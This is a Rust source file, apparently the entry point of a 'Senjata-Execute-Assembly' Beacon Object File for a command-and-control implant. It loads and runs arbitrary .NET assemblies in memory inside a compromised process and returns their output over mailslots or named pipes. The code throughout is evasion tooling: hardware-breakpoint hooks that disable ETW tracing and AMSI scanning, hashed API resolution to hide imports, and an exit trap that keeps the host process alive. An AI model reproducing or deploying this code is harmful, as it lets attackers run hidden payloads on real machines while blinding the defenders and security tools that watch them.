//! Senjata-Execute-Assembly BOF — entry point.
#![no_std]

pub mod args;
#[cfg(target_os = "windows")]
pub mod cleanup;
#[cfg(target_os = "windows")]
pub mod clr;
#[cfg(target_os = "windows")]
pub mod error;
#[cfg(target_os = "windows")]
pub mod io;
pub mod pe_parser;

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    #[cfg(target_os = "windows")]
    {
        match run(args, len) {
            Ok(()) => rustbof::eprintln!("[+] senjata-execute-assembly finished"),
            Err(e) => rustbof::eprintln!("[-] {}", e.format()),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (args, len);
    }
}

#[cfg(target_os = "windows")]
fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
    use error::BofError;
    let a = args::parse(raw_args, len).map_err(BofError::Args)?;
    rustbof::eprintln!("[dbg] args parsed");
    unsafe {
        let asm_info = pe_parser::parse(&a.asm_bytes).map_err(|e| match e {
            pe_parser::Error::MixedMode => BofError::MixedModeUnsupported,
            pe_parser::Error::ArchMismatch => BofError::ArchMismatch,
            pe_parser::Error::TargetFrameworkUnknown => BofError::TargetFrameworkUnknown,
            other => BofError::PeParse(other),
        })?;
        rustbof::eprintln!("[dbg] pe parsed ok");

        let engine = opsec_hwbp::HwbpEngine::init().map_err(BofError::Hwbp)?;
        rustbof::eprintln!("[dbg] hwbp engine init ok");
        let _etw = if a.etw {
            let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
            let exp_h = opsec_strcrypt::hash!("NtTraceControl");
            let target = opsec_peb::resolve_module(ntdll_h)
                .and_then(|m| opsec_peb::resolve_export(m, exp_h))
                .ok_or(BofError::PebResolve {
                    module_hash: ntdll_h,
                    export_hash: exp_h,
                })?;
            rustbof::eprintln!("[dbg] etw hook installed");
            Some(
                engine
                    .install_rip_ret(target as usize, 0)
                    .map_err(BofError::Hwbp)?,
            )
        } else {
            None
        };

        let host = clr::start(&asm_info)?;
        rustbof::eprintln!("[dbg] clr started");
        let io_ch = io::IoChannel::open(a.mailslot, &a.slot_name, &a.pipe_name)?;
        rustbof::eprintln!("[dbg] io channel open");
        let domain = clr::create_domain(&host, &a.app_domain)?;
        rustbof::eprintln!("[dbg] appdomain created");
        let _amsi = if a.amsi {
            rustbof::eprintln!("[dbg] installing amsi hooks");
            Some(engine.install_amsi_set().map_err(BofError::Hwbp)?)
        } else {
            None
        };

        let assembly = clr::load_assembly(&domain, &a.asm_bytes)?;
        rustbof::eprintln!("[dbg] assembly loaded");

        // save_cleanup_point acts like setjmp: the exit-trap VEH redirects back here
        // if the assembly calls Environment.Exit / RtlExitUserProcess.
        // `invoked` lives in run()'s stack frame (intact through the VEH redirect), so
        // on re-entry it is already true — we skip the invoke block and fall through
        // to normal RAII cleanup.
        let mut invoked = false;
        let (resume_rip, resume_rsp) = cleanup::save_cleanup_point();
        // The VEH exit-trap re-enters at save_cleanup_point which returns here a second time.
        // At that point `invoked == true` (set below), so we skip this block and fall through
        // to normal RAII cleanup. `let _ = invoked` below makes the compiler see the read.
        if !invoked {
            invoked = true;

            let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
            let exit_h = opsec_strcrypt::hash!("RtlExitUserProcess");
            let exit_target = opsec_peb::resolve_module(ntdll_h)
                .and_then(|m| opsec_peb::resolve_export(m, exit_h))
                .ok_or(BofError::PebResolve {
                    module_hash: ntdll_h,
                    export_hash: exit_h,
                })?;
            let _exit_trap = engine
                .install_exit_trap(exit_target as usize, 2, resume_rip, resume_rsp)
                .map_err(BofError::Hwbp)?;
            rustbof::eprintln!("[dbg] exit-trap installed, invoking...");

            clr::invoke(&assembly, &a.asm_args, a.entry_point)?;
            rustbof::eprintln!("[dbg] invoke returned");
            let output = io_ch.drain()?;
            rustbof::eprintln!("\n{}", output);
        } else {
            rustbof::eprintln!("[dbg] exit-trap fired, skipping to cleanup");
        }
        let _ = invoked; // make compiler see the VEH re-entry read of `invoked`
    }
    Ok(())
}
